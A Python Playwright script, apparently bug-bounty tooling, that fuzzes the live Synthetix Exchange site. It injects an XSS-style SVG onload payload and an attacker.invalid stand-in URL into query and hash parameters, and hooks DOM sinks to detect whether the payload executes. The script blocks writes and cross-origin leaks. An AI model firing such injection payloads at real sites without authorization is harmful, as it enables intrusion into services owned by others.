#!/usr/bin/env python3
"""Safe production-browser query/hash taint sweep for Synthetix Exchange.

The workflow derives query keys from the current full frontend artifact, then navigates only the
in-scope Exchange website with inert canaries. It instruments dangerous browser sinks and blocks
all PAPI writes, private WebSockets, transaction RPC calls, telemetry ingestion, and canary-bearing
cross-origin requests before transmission. No wallet, account, signature, credential, trade, balance,
or protocol state is touched.
"""
from __future__ import annotations

import asyncio
import hashlib
import io
import json
import os
import pathlib
import re
import urllib.parse
import urllib.request
import zipfile
from typing import Any

from playwright.async_api import Browser, Page, Request, Route, async_playwright

OUT = pathlib.Path("synthetix_query_taint_sweep")
OUT.mkdir(parents=True, exist_ok=True)
ARTIFACT_ID = 8660005480
REPO = "zerodaybugs/test"
BASE = "https://exchange.synthetix.io/"
TARGET_HOST = "exchange.synthetix.io"
MAX_KEYS = 80
WAIT_MS = 1800
CANARY = "ZDB_QT_7f51c9"
ATTACKER = "https://attacker.invalid/zdb-qt-7f51c9"
TELEMETRY_PARTS = ("sentry.io", "segment.io", "segment.com", "posthog.com", "intercom.io")
KEY_PATTERNS = [
    re.compile(r"(?:searchParams|URLSearchParams\([^)]*\))\.(?:get|has)\(\s*['\"]([A-Za-z0-9_.:-]{1,80})['\"]"),
    re.compile(r"\.get\(\s*['\"]([A-Za-z0-9_.:-]{1,80})['\"]\s*\)"),
    re.compile(r"[?&]([A-Za-z][A-Za-z0-9_.:-]{0,79})="),
]
DEFAULT_KEYS = {
    "market", "referral", "ref", "view", "uiHost", "webExperiment", "sessionHandoff",
    "redirect", "returnUrl", "returnTo", "next", "url", "callback", "source", "symbol",
    "tab", "account", "subAccountId", "walletAddress", "delegate", "destination",
}


def sha(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def download_graph() -> bytes:
    token = os.environ["GITHUB_TOKEN"]
    req = urllib.request.Request(
        f"https://api.github.com/repos/{REPO}/actions/artifacts/{ARTIFACT_ID}/zip",
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "User-Agent": "synthetix-authorized-query-taint/1.0",
        },
    )
    with urllib.request.urlopen(req, timeout=90) as response:
        return response.read(30 * 1024 * 1024)


def derive_keys(raw: bytes) -> tuple[list[str], dict[str, Any]]:
    keys = set(DEFAULT_KEYS)
    files = 0
    bytes_scanned = 0
    with zipfile.ZipFile(io.BytesIO(raw)) as outer:
        # GitHub artifact ZIP normally directly contains the collector directory/files.
        for name in outer.namelist():
            if not name.lower().endswith((".js", ".mjs", ".json", ".map", ".html")):
                continue
            try:
                data = outer.read(name)
            except Exception:
                continue
            if len(data) > 8 * 1024 * 1024:
                continue
            files += 1
            bytes_scanned += len(data)
            text = data.decode("utf-8", errors="ignore")
            for pattern in KEY_PATTERNS:
                for match in pattern.finditer(text):
                    key = match.group(1)
                    if 1 <= len(key) <= 80:
                        keys.add(key)
    priority = [
        "market", "view", "referral", "ref", "redirect", "returnUrl", "returnTo", "next", "url",
        "callback", "uiHost", "webExperiment", "sessionHandoff", "symbol", "source", "tab",
        "account", "subAccountId", "walletAddress", "delegate", "destination",
    ]
    ordered = []
    for key in priority + sorted(keys):
        if key not in ordered:
            ordered.append(key)
    return ordered[:MAX_KEYS], {"filesScanned": files, "bytesScanned": bytes_scanned, "derivedKeyCount": len(keys)}


INSTRUMENT = f"""
(() => {{
  const C = {json.dumps(CANARY)};
  const state = {{hits:[], executed:false, errors:[]}};
  Object.defineProperty(window, '__zdbTaint', {{value:state}});
  window.__ZDB_QT_EXEC = () => {{ state.executed = true; }};
  const text = (v) => {{ try {{ return String(v); }} catch (_) {{ return '<unstringifiable>'; }} }};
  const rec = (sink, value, extra={{}}) => {{
    const s = text(value);
    if (s.includes(C) || s.includes('attacker.invalid')) state.hits.push({{sink, value:s.slice(0,800), ...extra}});
  }};
  try {{
    const d = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    if (d && d.set) Object.defineProperty(Element.prototype, 'innerHTML', {{
      configurable:true, enumerable:d.enumerable,
      get:d.get,
      set:function(v){{ rec('innerHTML',v,{{tag:this.tagName}}); return d.set.call(this,v); }}
    }});
  }} catch(e){{state.errors.push('innerHTML:'+e)}}
  try {{
    const d = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
    if (d && d.set) Object.defineProperty(Element.prototype, 'outerHTML', {{
      configurable:true, enumerable:d.enumerable,
      get:d.get,
      set:function(v){{ rec('outerHTML',v,{{tag:this.tagName}}); return d.set.call(this,v); }}
    }});
  }} catch(e){{state.errors.push('outerHTML:'+e)}}
  for (const [proto,name] of [[Element.prototype,'insertAdjacentHTML'],[Document.prototype,'write'],[Document.prototype,'writeln']]) {{
    try {{ const orig=proto[name]; if(typeof orig==='function') proto[name]=function(...a){{ for(const v of a)rec(name,v); return orig.apply(this,a); }}; }} catch(e){{}}
  }}
  try {{ const orig=Element.prototype.setAttribute; Element.prototype.setAttribute=function(n,v){{
    if (/^(src|href|action|srcdoc|data)$/i.test(String(n))) rec('setAttribute:'+n,v,{{tag:this.tagName}});
    return orig.call(this,n,v);
  }}; }} catch(e){{}}
  try {{ const orig=window.open; window.open=function(u,...a){{rec('window.open',u); return null;}}; }} catch(e){{}}
  try {{ const orig=history.pushState; history.pushState=function(s,t,u){{rec('history.pushState',u); return orig.call(this,s,t,u);}}; }} catch(e){{}}
  try {{ const orig=history.replaceState; history.replaceState=function(s,t,u){{rec('history.replaceState',u); return orig.call(this,s,t,u);}}; }} catch(e){{}}
  try {{ const orig=window.eval; window.eval=function(v){{rec('eval',v); return orig.call(this,v);}}; }} catch(e){{}}
  try {{ const OF=window.Function; window.Function=function(...a){{for(const v of a)rec('Function',v); return OF(...a);}}; window.Function.prototype=OF.prototype; }} catch(e){{}}
  window.addEventListener('message', e => rec('message', JSON.stringify(e.data), {{origin:e.origin}}), true);
}})();
"""


async def run_case(browser: Browser, key: str, value: str, mode: str) -> dict[str, Any]:
    context = await browser.new_context(viewport={"width": 1280, "height": 800})
    await context.add_init_script(INSTRUMENT)
    page = await context.new_page()
    requests: list[dict[str, Any]] = []

    async def route_handler(route: Route, request: Request) -> None:
        parsed = urllib.parse.urlparse(request.url)
        host = (parsed.hostname or "").lower()
        method = request.method.upper()
        try:
            body = request.post_data or ""
        except Exception:
            body = ""
        canary_bearing = CANARY in request.url or "attacker.invalid" in request.url or CANARY in body
        tx_rpc = any(x in body for x in ("eth_sendTransaction", "eth_sendRawTransaction"))
        papi_write = host == "papi.synthetix.io" and (method != "GET" or parsed.path.rstrip("/").endswith("/trade"))
        private_ws = request.url.startswith("wss://papi.synthetix.io/v1/ws/trade")
        telemetry_write = any(part in host for part in TELEMETRY_PARTS) and method != "GET"
        third_party_write = host not in {TARGET_HOST, ""} and method != "GET"
        blocked = tx_rpc or papi_write or private_ws or telemetry_write or third_party_write or (canary_bearing and host != TARGET_HOST)
        if blocked or canary_bearing:
            requests.append({
                "method": method,
                "host": host,
                "path": parsed.path,
                "blocked": blocked,
                "canaryBearing": canary_bearing,
                "resourceType": request.resource_type,
            })
        if blocked:
            await route.abort("blockedbyclient")
        else:
            await route.continue_()

    await page.route("**/*", route_handler)
    if mode == "query":
        url = BASE + "?" + urllib.parse.urlencode({key: value})
    elif mode == "hash":
        url = BASE + "#" + urllib.parse.quote(value, safe="")
    else:
        raise ValueError(mode)
    error = None
    try:
        await page.goto(url, wait_until="domcontentloaded", timeout=45_000)
        await page.wait_for_timeout(WAIT_MS)
    except Exception as exc:  # noqa: BLE001
        error = f"{type(exc).__name__}: {exc}"[:500]
    state = await page.evaluate("() => window.__zdbTaint || {hits:[],executed:false,errors:['missing']}" )
    body_text = ""
    try:
        body_text = ((await page.locator("body").inner_text(timeout=2000)) or "")[:30000]
    except Exception:
        pass
    result = {
        "key": key,
        "mode": mode,
        "urlSha256": sha(url),
        "navigationError": error,
        "sinkHits": state.get("hits", [])[:100],
        "canaryExecuted": bool(state.get("executed")),
        "instrumentationErrors": state.get("errors", [])[:20],
        "bodyContainsCanary": CANARY in body_text,
        "bodyContainsAttackerHost": "attacker.invalid" in body_text,
        "requestMetadata": requests[:100],
    }
    await context.close()
    return result


async def main_async() -> None:
    graph = download_graph()
    keys, derivation = derive_keys(graph)
    payload = f"<svg id='{CANARY}' onload='window.__ZDB_QT_EXEC&&window.__ZDB_QT_EXEC()'></svg>{ATTACKER}"
    results: list[dict[str, Any]] = []
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            for key in keys:
                results.append(await run_case(browser, key, payload, "query"))
            results.append(await run_case(browser, "__hash__", payload, "hash"))
        finally:
            await browser.close()
    positive = [r for r in results if r["canaryExecuted"] or r["sinkHits"] or any(
        item.get("canaryBearing") and item.get("host") not in {TARGET_HOST, ""}
        for item in r["requestMetadata"]
    )]
    output = {
        "safety": "GET/navigation only; no wallet/account/signature/trade/state; all writes and canary-bearing cross-origin requests blocked.",
        "derivation": derivation,
        "testedKeys": keys,
        "caseCount": len(results),
        "positiveCaseCount": len(positive),
        "highConfidenceExecutionCount": sum(1 for r in results if r["canaryExecuted"]),
        "dangerousSinkCaseCount": sum(1 for r in results if r["sinkHits"]),
        "crossOriginCanaryAttemptCaseCount": sum(1 for r in results if any(
            i.get("canaryBearing") and i.get("host") not in {TARGET_HOST, ""} for i in r["requestMetadata"]
        )),
        "results": results,
        "verdict": "CANDIDATE_REQUIRES_MANUAL_REVIEW" if positive else "NO_QUERY_TO_DANGEROUS_SINK_OR_CROSS_ORIGIN_FLOW_FOUND",
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(json.dumps({k: output[k] for k in (
        "caseCount", "positiveCaseCount", "highConfidenceExecutionCount", "dangerousSinkCaseCount",
        "crossOriginCanaryAttemptCaseCount", "verdict"
    )}, indent=2))
    # Deliberately fail on a high-confidence execution so CI status itself is a safety gate.
    if output["highConfidenceExecutionCount"]:
        raise SystemExit(2)


def main() -> None:
    asyncio.run(main_async())


if __name__ == "__main__":
    main()
